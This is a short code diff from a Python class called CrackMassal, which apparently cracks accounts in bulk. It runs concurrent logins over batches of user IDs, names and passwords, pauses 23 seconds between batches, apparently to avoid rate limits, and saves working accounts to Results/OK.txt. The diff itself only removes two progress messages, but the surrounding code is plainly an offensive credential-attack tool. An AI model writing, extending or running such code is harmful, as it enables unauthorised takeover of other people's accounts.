@@ -187,12 +187,10 @@ class CrackMassal:
             batch = tasks[i:i + batch_size]
             batch_num = (i // batch_size) + 1
             total_batch = (len(tasks) + batch_size - 1) // batch_size
-            print(f"\r{P}[*] Batch {batch_num}/{total_batch} ({len(batch)} task)...")
             with ThreadPoolExecutor(max_workers=limit) as executor:
                 for uid, name, pw in batch:
                     executor.submit(self.login, uid, name, pw)
             if i + batch_size < len(tasks):
-                print(f"\n{K}[*] Jeda 23 detik sebelum batch berikutnya...{P}")
                 time.sleep(23)
         print(f"\n\n{I}[ DONE / SELESAI ]")
         print(f"{I}[+] Akun OK: {self.ok} ( hasil disimpan di Results/OK.txt )")
